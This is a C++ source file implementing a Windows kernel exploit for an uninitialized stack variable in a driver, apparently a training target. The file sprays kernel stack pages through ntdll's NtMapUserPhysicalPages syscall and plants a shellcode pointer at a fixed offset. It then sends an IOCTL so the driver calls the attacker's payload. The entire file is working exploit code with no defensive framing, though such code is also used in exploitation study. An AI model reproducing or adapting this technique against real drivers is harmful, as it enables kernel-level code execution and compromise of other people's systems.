#include "UninitializedStackVariable.h"

bool 
ExploitUninitializedStackVariable::exploit() {
	
	struct UninitializedStackVariableObject {
		DWORD unknown;
	//	void *callback;
	};

	UninitializedStackVariableObject obj;
	obj.unknown = 0xDEADBABE;
	
	auto shellcodePointer = adjustPayloadEpilogue(0);

	HANDLE hDriver = driver.getRawDriverHandle();
	DWORD writtenPtr;
	
	static const size_t Buffer_Size = sizeof(ULONG_PTR) * 1024;
	unique_ptr<char[]> kernelStackSpray(new char[Buffer_Size]);
	if(!kernelStackSpray) {
		wcerr << L"[!] Could not allocate 4096 bytes of heap memory for kernel stack spray buffer!" 
			<< endl;
		return false;	
	}
	
	memset(kernelStackSpray.get(), 0x41, Buffer_Size);
	
	// Set the value for uninitialized object's Callback member:
	static const size_t Callback_Variable_Offset = 3500;
	*(reinterpret_cast<DWORD*>(&kernelStackSpray[Callback_Variable_Offset])) = reinterpret_cast<DWORD>(shellcodePointer.get());
	
		
	// Distance from the offset where the `Callback` is placed on the stack
	// to the top of stack is: 0x504.
	wcout << L"[+] Spraying Kernel stack pages via nt!NtMapUserPhysicalPages..." << endl;
	wcout << L"\tSending IOCTL immediately right after to avoid stack clobbering." << endl;
	
	if(!ExploitUninitializedStackVariable::sprayKernelStackPages(kernelStackSpray.get(), Buffer_Size)) {
		wcerr << L"[!] Failed." << endl;
		return false;
	}

	BOOL ret = DeviceIoControl(hDriver, 
		ExploitUninitializedStackVariable::Ioctl_Code,
		&obj,
		sizeof(obj),
		nullptr,
		0,
		&writtenPtr,
		nullptr
	);
	
	return ret;
}

bool 
ExploitUninitializedStackVariable::sprayKernelStackPages(
	void* buffer, 
	size_t bufferSize
) {
	
	typeNtMapUserPhysicalPages NtMapUserPhysicalPages;
	NtMapUserPhysicalPages  = reinterpret_cast<typeNtMapUserPhysicalPages>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), 
		"NtMapUserPhysicalPages"
	));
	
	if(!NtMapUserPhysicalPages) {
		wcerr << L"[!] Could not locate ntdll!NtMapUserPhysicalPages" << endl;
		return false;
	}
	
	// Spraying Kernel stack memory pages via nt!NtMapUserPhysicalPages syscall as documented
	// by j00ru in his http://j00ru.vexillium.org/?p=769
	NTSTATUS stat = NtMapUserPhysicalPages (
		nullptr,
		bufferSize / 1024,
		reinterpret_cast<PULONG_PTR>(buffer)
	);

	// This is expected to have the NtMapUserPhysicalPages return STATUS_INVALID_PARAMERER_1 code.
	static const NTSTATUS Expected_Failure_Code = 0xC00000EF;
	
	if(!NT_SUCCESS(stat) && stat != Expected_Failure_Code) {
		wcerr << L"[!] Kernel Stack spraying failed! Error: 0x" << hex 
			<< setw(8) << setfill(L'0') << stat << endl;
		return false;
	}
	
	return true;
}
